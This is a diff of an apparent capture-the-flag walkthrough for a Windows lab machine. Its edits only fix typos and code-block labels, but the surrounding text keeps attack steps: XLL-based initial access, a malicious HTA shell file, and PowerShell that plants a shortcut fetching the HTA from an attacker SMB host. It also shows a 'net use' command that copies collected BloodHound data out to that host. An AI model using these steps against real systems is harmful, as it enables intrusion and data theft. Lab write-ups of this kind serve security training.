@@ -40,8 +40,6 @@ Based on the website, it seems like the initial foothold could be related to ema
 ## Shell as gideon.hamill
 ### XLL Exec
 
-
-
 Through many attempts, we discovered this mail server is vulnerable to [XLL Exec](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec).
 
 
@@ -113,7 +111,7 @@ Let's create maliciously crafted .hta file inside `C:\inetpub\testing` and wait 
 
 We will create shell.hta file with the following [content](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#hta-example):
 
-```hta 
+```html 
 <html>
 <head>
 <HTA:APPLICATION ID="shell">
@@ -130,7 +128,7 @@ We will create shell.hta file with the following [content](https://book.hacktric
 
 Now on the target system, we will execute following commands so that it will download shell.hta and create shortcut leading to it:
 
-```
+```powershell
 $url = "file://10.10.14.36/share/shell.hta"
 $shortcutPath = "C:\inetpub\testing\shell.url"
 $shortcutContent = "[InternetShortcut]`r`nURL=$url"
@@ -155,7 +153,7 @@ Since this is an Active Directory machine, we will upload and run bloodhound.exe
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-11.png)
 
-Let's download create zip file.
+Let's download the created zip file.
 
 We will first start impacket-smbserver:
 
@@ -163,7 +161,7 @@ We will first start impacket-smbserver:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-12.png)
 
-User `net use` command to transfer the zip file to local kali machine:
+Use `net use` command to transfer the zip file to local kali machine:
 
 ```
 net use * \\10.10.14.23\share
